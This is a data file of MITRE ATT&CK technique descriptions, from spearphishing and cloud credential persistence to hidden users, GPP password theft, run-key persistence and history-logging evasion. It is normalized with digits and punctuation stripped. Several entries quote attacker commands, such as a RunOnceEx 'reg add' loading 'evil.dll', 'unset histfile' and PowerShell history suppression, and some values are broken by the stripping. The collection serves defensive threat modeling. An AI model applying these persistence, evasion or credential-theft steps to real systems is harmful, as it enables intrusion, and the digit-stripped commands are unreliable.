attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc,['enterprise-attack'],['T1598.002'],Spearphishing Attachment,adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting  spearphishing for information is an attempt to trick targets into divulging information  frequently credentials or other actionable information  spearphishing for information frequently involves social engineering techniques  such as posing as a source with a reason to collect information  ex   establish  or  compromise  and or sending multiple  seemingly urgent messages_  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file_ citation  sophos attachment  citation  github phishery  the text of the spearphishing email usually tries to give a plausible reason why the file should be filled in  such as a request for information from a business associate  adversaries may also use information from previous reconnaissance efforts  ex   search open  or  search victim owned  to craft persuasive and believable lures 
attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd,['enterprise-attack'],['T1098.001'],Additional Cloud Credentials,adversaries may add adversary controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment_  for example  adversaries may add credentials for service principals and applications in addition to existing legitimate credentials in azure ad_ citation  microsoft solarwinds customer guidance  citation  blue cloud of death  citation  blue cloud of death video  these credentials include both x    keys and passwords_ citation  microsoft solarwinds customer guidance  with sufficient permissions  there are a variety of ways to add credentials including the azure portal  azure command line interface  and azure or az powershell modules_ citation  demystifying azure ad service principals   in infrastructure as a service  iaas  environments  after gaining access through  cloud  adversaries may generate or import their own ssh keys using either the createkeypair or importkeypair api in aws or the gcloud compute os login ssh keys add command in gcp_ citation  gcp ssh key add  this allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts_ citation  expel io evil in aws  citation  expel behind the scenes   adversaries may also use the createaccesskey api in aws or the gcloud iam service accounts keys create command in gcp to add access keys to an account  if the target account has different permissions from the requesting account  the adversary may also be able to escalate their privileges in the environment  i_e   cloud  rhino security labs aws privilege escalation 
attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5,['enterprise-attack'],['T1204'],User Execution,an adversary may rely upon specific actions by a user in order to gain execution  users may be subjected to social engineering to get them to execute malicious code by  for example  opening a malicious document file or link  these user actions will typically be observed as follow on behavior from forms of   while  user  frequently occurs shortly after initial access it may occur at other phases of an intrusion  such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it  this activity may also be seen shortly after  internal   adversaries may also deceive users into performing actions such as enabling  remote access  allowing direct control of the system to the adversary  or downloading and executing malware for  user  for example  tech support scams can be facilitated through  vishing  or various forms of user interaction  adversaries can use a combination of these methods  such as spoofing and promoting toll free numbers or call centers that are used to direct victims to malicious websites  to deliver and execute payloads containing malware or  remote access  telephone attack delivery 
attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103,['enterprise-attack'],['T1491.001'],Internal Defacement,an adversary may deface systems internal to an organization in an attempt to intimidate or mislead users  thus discrediting the integrity of the systems  this may take the form of modifications to internal websites  or directly to user systems with the replacement of the desktop wallpaper_ citation  novetta blockbuster  disturbing or offensive images may be used as a part of  internal  in order to cause user discomfort  or to pressure compliance with accompanying messages  since internally defacing systems exposes an adversary's presence  it often takes place after other intrusion goals have been accomplished_ citation  novetta blockbuster destructive malware 
attack-pattern--8c4aef43-48d5-49aa-b2af-c0cd58d30c3d,['enterprise-attack'],['T1564.002'],Hidden Users,adversaries may use hidden users to hide the presence of user accounts they create or modify  administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users    in macos  adversaries can create or modify a user to be hidden through manipulating plist files  folder attributes  and user attributes  to prevent a user from being shown on the login screen and in system preferences  adversaries can set the userid to be under     and set the key value hide   users to true in the  library preferences com_apple_loginwindow plist file_ citation  cybereason osx pirrit  every user has a userid associated with it  when the hide   users key value is set to true  users with a userid under     do not appear on the login screen and in system preferences  using the command line  adversaries can use the dscl utility to create hidden user accounts by setting the ishidden attribute to    adversaries can also hide a user s home folder by changing the chflags to hidden_ citation  apple support hide a user account    adversaries may similarly hide user accounts in windows  adversaries can set the hklm software microsoft windows nt currentversion winlogon specialaccounts userlist registry key value to   for a specific user to prevent that user from being listed on the logon screen_ citation  fireeye smokedham june       citation  us cert ta      a   on linux systems  adversaries may hide user accounts from the login screen  also referred to as the greeter  the method an adversary may use depends on which display manager the distribution is currently using  for example  on an ubuntu system using the gnome display manger  gdm   accounts may be hidden from the greeter using the gsettings command  ex  sudo  u gdm gsettings set org_gnome_login screen disable user list true _ citation  hide gdm user accounts  display managers are not anchored to specific distributions and may be changed by a user or adversary 
attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819,['enterprise-attack'],['T1134.003'],Make and Impersonate Token,adversaries may make and impersonate tokens to escalate privileges and bypass access controls  if an adversary has a username and password but the user is not logged onto the system  the adversary can then create a logon session for the user using the logonuser function  the function will return a copy of the new session's access token and the adversary can use setthreadtoken to assign the token to a thread 
attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e,['enterprise-attack'],['T1552.006'],Group Policy Preferences,adversaries may attempt to find unsecured credentials in group policy preferences  gpp   gpp are tools that allow administrators to create domain policies with embedded credentials  these policies allow administrators to set local accounts_ citation  microsoft gpp        these group policies are stored in sysvol on a domain controller  this means that any domain user can view the sysvol share and decrypt the password  using the aes key that has been made public _ citation  microsoft gpp key   the following tools and scripts can be used to gather and decrypt the password file from group policy preference xml files     metasploit s post exploitation module  post windows gather credentials gpp   get gpppassword citation  obscuresecurity get gpppassword    gpprefdecrypt_py  on the sysvol share  adversaries may use the following command to enumerate potential gpp xml files  dir  s   _xml
attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e,['enterprise-attack'],['T1196'],Control Panel Items,windows control panel items are utilities that allow users to view and adjust computer settings  control panel items are registered executable  _exe  or control panel  _cpl  files  the latter are actually renamed dynamic link library  _dll  files that export a cplapplet function   citation  microsoft implementing cpl   citation  trendmicro cpl malware jan       control panel items can be executed directly from the command line  programmatically via an application programming interface  api  call  or by simply double clicking the file   citation  microsoft implementing cpl   citation  trendmicro cpl malware jan        citation  trendmicro cpl malware dec        for ease of use  control panel items typically include graphical menus available to users after being registered and loaded into the control panel   citation  microsoft implementing cpl   adversaries can use control panel items as execution payloads to execute arbitrary commands  malicious control panel items can be delivered via  spearphishing  campaigns  citation  trendmicro cpl malware jan        citation  trendmicro cpl malware dec       or executed as part of multi stage malware   citation  palo alto reaver nov       control panel items  specifically cpl files  may also bypass application and or file extension whitelisting 
attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5,['enterprise-attack'],['T1048.002'],Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel  the data may also be sent to an alternate network location from the main command and control server    asymmetric encryption algorithms are those that use different keys on each end of the channel  also known as public key cryptography  this requires pairs of cryptographic keys that can encrypt decrypt data from the corresponding key  each end of the communication channels requires a private key  only in the procession of that entity  and the public key of the other entity  the public keys of each entity are exchanged before encrypted communications begin    network protocols that use asymmetric encryption  such as https tls ssl  often utilize symmetric encryption once keys are exchanged  adversaries may opt to use these encrypted mechanisms that are baked into a protocol 
attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe,['enterprise-attack'],['T1087.004'],Cloud Account,adversaries may attempt to get a listing of cloud accounts  cloud accounts are those created and configured by an organization for use by users  remote support  services  or for administration of resources within a cloud service provider or saas application_  with authenticated access there are several tools that can be used to find accounts  the get msolrolemember powershell cmdlet can be used to obtain account names given a role or permissions group in office    _ citation  microsoft msolrolemember  citation  github raindance  the azure cli  az cli  also provides an interface to obtain user accounts with authenticated access to a domain  the command az ad user list will list all users within a domain_ citation  microsoft az cli  citation  black hills red teaming ms ad azure          the aws command aws iam list users may be used to obtain a list of users in the current account while aws iam list roles can obtain iam roles that have a specified path prefix_ citation  aws list roles  citation  aws list users  in gcp  gcloud iam service accounts list and gcloud projects get iam policy may be used to obtain a listing of service accounts and users in a project_ citation  google cloud   iam servie accounts list api 
attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580,['enterprise-attack'],['T1057'],Process Discovery,adversaries may attempt to get information about running processes on a system  information obtained could be used to gain an understanding of common software applications running on systems within the network  adversaries may use the information from  process  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  in windows environments  adversaries could obtain details on running processes using the  utility via  or get process via  information about processes can also be extracted from the output of  native  calls such as createtoolhelp  snapshot  in mac and linux  this is accomplished with the ps command  adversaries may also opt to enumerate processes via  proc 
attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59,['enterprise-attack'],['T1562.003'],Impair Command History Logging,adversaries may impair command history logging to hide commands they run on a compromised system  various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done    on linux and macos  command history is tracked in a file pointed to by the environment variable histfile  when a user logs off a system  this information is flushed to a file in the user's home directory called   _bash_history  the histcontrol environment variable keeps track of what should be saved by the history command and eventually into the   _bash_history file when a user logs out  histcontrol does not exist by default on macos  but can be set by the user and will be respected_  adversaries may clear the history environment variable  unset histfile  or set the command history size to zero  export histfilesize    to prevent logging of commands  additionally  histcontrol can be configured to ignore commands that start with a space by simply setting it to  ignorespace   histcontrol can also be set to ignore duplicate commands by setting it to  ignoredups   in some linux systems  this is set by default to  ignoreboth  which covers both of the previous examples  this means that   ls  will not be saved  but  ls  would be saved by history  adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands    on windows systems  the psreadline module tracks commands used in all powershell sessions and writes them to a file   env appdata microsoft windows powershell psreadline consolehost_history_txt by default   adversaries may change where these logs are saved using set psreadlineoption  historysavepath  file path   this will cause consolehost_history_txt to stop receiving logs  additionally  it is possible to turn off logging to this file using the powershell command set psreadlineoption  historysavestyle savenothing_ citation  microsoft powershell command history  citation  sophos powershell command audit  citation  sophos powershell command history forensics   adversaries may also leverage a  network device  on network devices to disable historical command logging  e_g  no logging  
attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3,['enterprise-attack'],['T1053.004'],Launchd,this technique is deprecated due to the inaccurate usage  the report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services  other system services are used to interact with launchd rather than launchd being used by itself    adversaries may abuse the launchd daemon to perform task scheduling for initial or recurring execution of malicious code  the launchd daemon  native to macos  is responsible for loading and maintaining services within the operating system  this process loads the parameters for each launch on demand system level daemon from the property list  plist  files found in  system library launchdaemons and  library launchdaemons  citation  appledocs launch agent daemons   these launchdaemons have property list files which point to the executables that will be launched  citation  methods of mac malware persistence _  an adversary may use the launchd daemon in macos environments to schedule new executables to run at system startup or on a scheduled basis for persistence  launchd can also be abused to run a process under the context of a specified account  daemons  such as launchd  run with the permissions of the root user account  and will operate regardless of which user account is logged in 
attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58,['enterprise-attack'],['T1546.003'],Windows Management Instrumentation Event Subscription,adversaries may establish persistence and elevate privileges by executing malicious content triggered by a windows management instrumentation  wmi  event subscription  wmi can be used to install event filters  providers  consumers  and bindings that execute code when a defined event occurs  examples of events that may be subscribed to are the wall clock time  user loging  or the computer's uptime_ citation  mandiant m trends        adversaries may use the capabilities of wmi to subscribe to an event and execute arbitrary code when that event occurs  providing persistence on a system_ citation  fireeye wmi sans       citation  fireeye wmi       adversaries may also compile wmi scripts into windows management object  mof  files  _mof extension  that can be used to create a malicious subscription_ citation  dell wmi persistence  citation  microsoft mof may        wmi subscription execution is proxied by the wmi provider host process  wmiprvse_exe  and thus may result in elevated system privileges 
attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75,['enterprise-attack'],['T1596.004'],CDNs,adversaries may search content delivery network  cdn  data about victims that can be used during targeting  cdns allow an organization to host content from a distributed  load balanced array of servers  cdns may also allow organizations to customize content delivery based on the requestor s geographical region_  adversaries may search cdn data to gather actionable information  threat actors can use online resources and lookup tools to harvest information about content servers within a cdn  adversaries may also seek and target cdn misconfigurations that leak sensitive information not intended to be hosted and or do not have the same protection mechanisms  ex  login portals  as the content hosted on the organization s website_ citation  digitalshadows cdn  information from these sources may reveal opportunities for other forms of reconnaissance  ex   active  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   drive by
attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938,['enterprise-attack'],['T1497.002'],User Activity Based Checks,adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments  this may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment  vme  or sandbox  if the adversary detects a vme  they may alter their malware to disengage from the victim or conceal the core functions of the implant  they may also search for vme artifacts before dropping secondary or additional payloads  adversaries may use the information learned from  virtualization sandbox  during automated discovery to shape follow on behaviors_ citation  deloitte environment awareness   adversaries may search for user activity on the host based on variables such as the speed frequency of mouse movements and clicks  citation  sans virtual jan         browser history  cache  bookmarks  or number of files in common directories such as home or the desktop  other methods may rely on specific user interaction with the system before the malicious code is activated  such as waiting for a document to close before activating a macro  citation  unit    sofacy nov       or waiting for a user to double click on an embedded image to activate_ citation  fireeye fin  april      
attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b,['enterprise-attack'],['T1141'],Input Prompt,when programs are executed that need additional privileges than are present in the current user context  it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task  ex   bypass user account   adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage  such as a fake installer requiring additional access or a fake malware removal suite_ citation  osx malware exploits mackeeper  this type of prompt can be used to collect credentials via various languages such as  logrhythm do you trust oct       citation  osx keydnap malware  and  logrhythm do you trust oct       citation  enigma phishing for credentials jan       
attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5,['enterprise-attack'],['T1585.003'],Cloud Accounts,adversaries may create accounts with cloud providers that can be used during targeting  adversaries can use cloud accounts to further their operations  including leveraging cloud storage services such as dropbox  microsoft onedrive  or aws s  buckets for  exfiltration to cloud  or to  upload  cloud accounts can also be used in the acquisition of infrastructure  such as  virtual private  or  infrastructure  establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers_ citation  awake security c  cloud   creating  cloud  may also require adversaries to establish  email  to register with the cloud provider 
attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414,['enterprise-attack'],['T1072'],Software Deployment Tools,adversaries may gain access to and use third party software suites installed within an enterprise network  such as administration  monitoring  and deployment systems  to move laterally through the network  third party applications and software deployment systems may be in use in the network environment for administration purposes  e_g_  sccm  hbss  altiris  etc_ _  access to a third party network wide or enterprise wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system  the access may be used to laterally move to other systems  gather information  or cause a specific effect  such as wiping the hard drives on all endpoints_  the permissions required for this action vary by system configuration  local credentials may be sufficient with direct access to the third party system  or specific domain credentials may be required  however  the system may require an administrative account to log in or to perform it's intended purpose 
attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d,['enterprise-attack'],['T1041'],Exfiltration Over C2 Channel,adversaries may steal data by exfiltrating it over an existing command and control channel  stolen data is encoded into the normal communications channel using the same protocol as command and control communications 
attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a,['enterprise-attack'],['T1134.004'],Parent PID Spoofing,adversaries may spoof the parent process identifier  ppid  of a new process to evade process monitoring defenses or to elevate privileges  new processes are typically spawned directly from their parent  or calling  process unless explicitly specified  one way of explicitly assigning the ppid of a new process is via the createprocess api call  which supports a parameter that defines the ppid to use_ citation  didierstevens selectmyparent nov       this functionality is used by windows features such as user account control  uac  to correctly set the ppid after a requested elevated process is spawned by system  typically via svchost_exe or consent_exe  rather than the current user context_ citation  microsoft uac nov        adversaries may abuse these mechanisms to evade defenses  such as those blocking processes spawning directly from office documents  and analysis targeting unusual potentially malicious parent child process relationships  such as spoofing the ppid of  to be explorer_exe rather than an office document delivered as part of  spearphishing  countercept ppid spoofing dec       this spoofing could be executed via  visual  within a malicious office document or any code that can perform  native  ctd ppid spoofing macro mar       citation  countercept ppid spoofing dec        explicitly assigning the ppid may also enable elevated privileges given appropriate access rights to the parent process  for example  an adversary in a privileged user context  i_e  administrator  may spawn a new process and assign the parent as a process running as system  such as lsass_exe   causing the new process to be elevated via the inherited access token_ citation  xpnsec ppid nov      
attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23,['enterprise-attack'],['T1591'],Gather Victim Org Information,adversaries may gather information about the victim's organization that can be used during targeting  information about an organization may include a variety of details  including the names of divisions departments  specifics of business operations  as well as the roles and responsibilities of key employees_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about an organization may also be exposed to adversaries via online or other accessible data sets  ex   social  or  search victim owned  threatpost broadvoice leak  citation  sec edgar search  gathering this information may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   or  trusted
attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc,['enterprise-attack'],['T1060'],Registry Run Keys / Startup Folder,adversaries may achieve persistence by adding a program to a startup folder or referencing it with a registry run key  adding an entry to the  run keys  in the registry or startup folder will cause the program referenced to be executed when a user logs in   citation  microsoft run key  these programs will be executed under the context of the user and will have the account's associated permissions level_  placing a program within a startup folder will cause that program to execute when a user logs in  there is a startup folder location for individual user accounts as well as a system wide startup folder that will be checked regardless of which user account logs in_  the startup folder path for the current user is    c  users  username  appdata roaming microsoft windows start menu programs startup the startup folder path for all users is    c  programdata microsoft windows start menu programs startup  the following run keys are created by default on windows systems    hkey_current_user software microsoft windows currentversion run   hkey_current_user software microsoft windows currentversion runonce   hkey_local_machine software microsoft windows currentversion run   hkey_local_machine software microsoft windows currentversion runonce  the hkey_local_machine software microsoft windows currentversion runonceex is also available but is not created by default on windows vista and newer  registry run key entries can reference programs directly or list them as a dependency   citation  microsoft runonceex apr       for example  it is possible to load a dll at logon using a  depend  key with runonceex  reg add hklm software microsoft windows currentversion runonceex      depend  v    d  c  temp evil _ dll   citation  oddvar moe runonceex mar        the following registry keys can be used to set startup folder items for persistence    hkey_current_user software microsoft windows currentversion explorer user shell folders   hkey_current_user software microsoft windows currentversion explorer shell folders   hkey_local_machine software microsoft windows currentversion explorer shell folders   hkey_local_machine software microsoft windows currentversion explorer user shell folders  the following registry keys can control automatic startup of services during boot    hkey_local_machine software microsoft windows currentversion runservicesonce   hkey_current_user software microsoft windows currentversion runservicesonce   hkey_local_machine software microsoft windows currentversion runservices   hkey_current_user software microsoft windows currentversion runservices  using policy settings to specify startup programs creates corresponding values in either of two registry keys    hkey_local_machine software microsoft windows currentversion policies explorer run   hkey_current_user software microsoft windows currentversion policies explorer run  the winlogon key controls actions that occur when a user logs on to a computer running windows    most of these actions are under the control of the operating system  but you can also add custom actions here  the hkey_local_machine software microsoft windows nt currentversion winlogon userinit and hkey_local_machine software microsoft windows nt currentversion winlogon shell subkeys can automatically launch programs_  programs listed in the load value of the registry key hkey_current_user software microsoft windows nt currentversion windows run when any user logs on_  by default  the multistring bootexecute value of the registry key hkey_local_machine system currentcontrolset control session manager is set to autocheck autochk    this value causes windows  at startup  to check the file system integrity of the hard disks if the system has been shut down abnormally  adversaries can add other programs or processes to this registry value which will automatically launch at boot_  adversaries can use these configuration locations to execute malware  such as remote access tools  to maintain persistence through system reboots  adversaries may also use  to make the registry entries look as if they are associated with legitimate programs 
attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c,['enterprise-attack'],['T1606'],Forge Web Credentials,adversaries may forge credential materials that can be used to gain access to web applications or internet services  web applications and services  hosted in cloud saas environments or on premise servers  often use session cookies  tokens  or other materials to authenticate and authorize user access_  adversaries may generate these credential materials in order to gain access to web resources  this differs from  steal web session   steal application access  and other similar behaviors in that the credentials are new and forged by the adversary  rather than stolen or intercepted from legitimate users  the generation of web credentials often requires secret values  such as passwords   private  or other cryptographic seed values_ citation  github aws adfs credential generator   once forged  adversaries may use these web credentials to access resources  ex   use alternate authentication  which may bypass multi factor and other authentication protection mechanisms_ citation  pass the cookie  citation  unit    mac crypto cookies january       citation  microsoft solarwinds customer guidance 
attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493,['enterprise-attack'],['T1621'],Multi-Factor Authentication Request Generation,adversaries may attempt to bypass multi factor authentication  mfa  mechanisms and gain access to accounts by generating mfa requests sent to users_  adversaries in possession credentials to  valid  may be unable to complete the login process if they lack access to the  fa or mfa mechanisms required as an additional credential and security control  to circumvent this  adversaries may abuse the automatic generation of push notifications to mfa services such as duo push  microsoft authenticator  okta  or similar services to have the user grant access to their account_  in some cases  adversaries may continuously repeat login attempts in order to bombard users with mfa push notifications  sms messages  and phone calls  potentially resulting in the user finally accepting the authentication request in response to  mfa fatigue_  citation  russian  fa push annoyance   cimpanu  citation  mfa fatigue attacks   portswigger  citation  suspected russian activity targeting government and business entities around the globe 
attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5,['enterprise-attack'],['T1554'],Compromise Client Software Binary,adversaries may modify client software binaries to establish persistent access to systems  client software enables users to access services provided by a server  common client software types are ssh clients  ftp clients  email clients  and web browsers_  adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use  for example  an adversary may copy source code for the client software  add a backdoor  compile for the target  and replace the legitimate application binary  or support files  with the backdoored one  since these applications may be routinely executed by the user  the adversary can leverage this for persistent access to the host 
attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736,['enterprise-attack'],['T1059.001'],PowerShell,adversaries may abuse powershell commands and scripts for execution  powershell is a powerful interactive command line interface and scripting environment included in the windows operating system_ citation  technet powershell  adversaries can use powershell to perform a number of actions  including discovery of information and execution of code  examples include the start process cmdlet which can be used to run an executable and the invoke command cmdlet which runs a command locally or on a remote computer  though administrator permissions are required to use powershell to connect to remote systems _  powershell may also be used to download and run executables from the internet  which can be executed from disk or in memory without touching disk_  a number of powershell based offensive testing tools are available  including     and psattack_ citation  github psattack   powershell commands scripts can also be executed without directly invoking the powershell_exe binary through interfaces to powershell's underlying system_management_automation assembly dll exposed through the _net framework and windows common language interface  cli _ citation  sixdub powerpick jan       citation  silentbreak offensive ps dec       citation  microsoft psfromcsharp apr      
attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810,['enterprise-attack'],['T1023'],Shortcut Modification,shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process  adversaries could use shortcuts to execute their tools for persistence  they may create a new shortcut as a means of indirection that may use  to look like a legitimate program  adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program 
attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c,['enterprise-attack'],['T1546.001'],Change Default File Association,adversaries may establish persistence by executing malicious content triggered by a file type association  when a file is opened  the default program used to open the file  also called the file association or handler  is checked  file association selections are stored in the windows registry and can be edited by users  administrators  or programs that have registry access or by administrators using the built in assoc utility_ citation  microsoft change default programs  citation  microsoft file handlers  citation  microsoft assoc oct       applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened_  system file associations are listed under hkey_classes_root _ extension   for example hkey_classes_root _txt  the entries point to a handler for that extension located at hkey_classes_root   handler   the various commands are then listed as subkeys underneath the shell key at hkey_classes_root   handler  shell   action  command  for example      hkey_classes_root txtfile shell open command   hkey_classes_root txtfile shell print command   hkey_classes_root txtfile shell printto command  the values of the keys listed are commands that are executed when the handler opens the file extension  adversaries can modify these values to continually execute arbitrary commands_ citation  trendmicro troj fakeav oct      
attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5,['enterprise-attack'],['T1055.014'],VDSO Hijacking,adversaries may inject malicious code into processes via vdso hijacking in order to evade process based defenses as well as possibly elevate privileges  virtual dynamic shared object  vdso  hijacking is a method of executing arbitrary code in the address space of a separate live process    vdso hijacking involves redirecting calls to dynamically linked shared libraries  memory protections may prevent writing executable code to a process via  ptrace system  however  an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object  this code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table  which store absolute addresses of mapped library functions _ citation  elf injection may       citation  backtrace vdso  citation  vdso aug       citation  syscall        running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via vdso hijacking may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--99709758-2b96-48f2-a68a-ad7fbd828091,['enterprise-attack'],['T1026'],Multiband Communication,  this technique has been deprecated and should no longer be used_    some adversaries may split communications between different protocols  there could be one protocol for inbound command and control and another for outbound data  allowing it to bypass certain firewall restrictions  the split could also be random to simply avoid data threshold alerts on any one communication 
attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b,['enterprise-attack'],['T1071.002'],File Transfer Protocols,adversaries may communicate using application layer protocols associated with transferring files to avoid detection network filtering by blending in with existing traffic  commands to the remote system  and often the results of those commands  will be embedded within the protocol traffic between the client and server    protocols such as ftp  ftps  and tftp that transfer files may be very common in environments   packets produced from these protocols may have many fields and headers in which data can be concealed  data could also be concealed within the transferred files  an adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal  expected traffic 
attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69,['enterprise-attack'],['T1122'],Component Object Model Hijacking,the component object model  com  is a system within windows to enable interaction between software components through the operating system   citation  microsoft component object model  adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the com references and relationships as a means for persistence  hijacking a com object requires a change in the windows registry to replace a reference to a legitimate system component which may cause that component to not work when executed  when that system component is executed through normal system operation the adversary's code will be executed instead   citation  gdata com hijacking  an adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence  but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection 
attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3,['enterprise-attack'],['T1015'],Accessibility Features,windows contains accessibility features that may be launched with a key combination before a user has logged in  for example  when the user is on the windows logon screen   an adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system_  two common accessibility programs are c  windows system   sethc_exe  launched when the shift key is pressed five times and c  windows system   utilman_exe  launched when the windows   u key combination is pressed  the sethc_exe program is often referred to as  sticky keys   and has been used by adversaries for unauthenticated access through a remote desktop login screen   citation  fireeye hikit rootkit   depending on the version of windows  an adversary may take advantage of these features in different ways because of code integrity enhancements  in newer versions of windows  the replaced binary needs to be digitally signed for x   systems  the binary must reside in  systemdir    and it must be protected by windows file or resource protection  wfp wrp    citation  defcon     sticky keys  the debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced  examples for both methods   for simple binary replacement on windows xp and later as well as and windows server      r  and later  for example  the program  e_g_  c  windows system   utilman_exe  may be replaced with  cmd_exe   or another program that provides backdoor access   subsequently  pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  remote desktop  will cause the replaced file to be executed with system privileges   citation  tilbury        for the debugger method on windows vista and later as well as windows server      and later  for example  a registry key may be modified that configures  cmd_exe   or another program that provides backdoor access  as a  debugger  for the accessibility program  e_g_   utilman_exe    after the registry is modified  pressing the appropriate key combination at the login screen while at the keyboard or when connected with rdp will cause the  debugger  program to be executed with system privileges   citation  tilbury        other accessibility features exist that may also be leveraged in a similar fashion   citation  defcon     sticky keys     on screen keyboard  c  windows system   osk_exe   magnifier  c  windows system   magnify_exe   narrator  c  windows system   narrator_exe   display switcher  c  windows system   displayswitch_exe   app switcher  c  windows system   atbroker_exe
attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36,['enterprise-attack'],['T1212'],Exploitation for Credential Access,adversaries may exploit software vulnerabilities in an attempt to collect credentials  exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program  service  or within the operating system software or kernel itself to execute adversary controlled code_ credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems  one example of this is ms        which targets kerberos and can be used to forge kerberos tickets using domain user permissions_ citation  technet ms        citation  adsecurity detecting forged tickets  exploitation for credential access may also result in privilege escalation depending on the process targeted or credentials obtained 
attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd,['enterprise-attack'],['T1546.014'],Emond,adversaries may gain persistence and elevate privileges by executing malicious content triggered by the event monitor daemon  emond   emond is a  launch  that accepts events from various services  runs them through a simple rules engine  and takes action  the emond binary at  sbin emond will load any rules from the  etc emond_d rules  directory and take action once an explicitly defined event takes place_  the rule files are in the plist format and define the name  event type  and action to take  some examples of event types include system startup and user authentication  examples of actions are to run a system command or send an email  the emond service will not launch if there is no file present in the queuedirectories path  private var db emondclients  specified in the  launch  configuration file at system library launchdaemons com_apple_emond_plist_ citation  xorrior emond jan       citation  magnusviri emond apr       citation  sentinelone macos persist jun        adversaries may abuse this service by writing a rule to execute commands when a defined event occurs  such as system start up or user authentication_ citation  xorrior emond jan       citation  magnusviri emond apr       citation  sentinelone macos persist jun       adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the  launch  service 
attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8,['enterprise-attack'],['T1102.003'],One-Way Communication,adversaries may use an existing  legitimate external web service as a means for sending commands to a compromised system without receiving return output over the web service channel  compromised systems may leverage popular websites and social media to host command and control  c   instructions  those infected systems may opt to send the output from those commands back over a different c  channel  including to another distinct web service  alternatively  compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response_  popular websites and social media acting as a mechanism for c  may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise  using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  web service providers commonly use ssl tls encryption  giving adversaries an added level of protection 
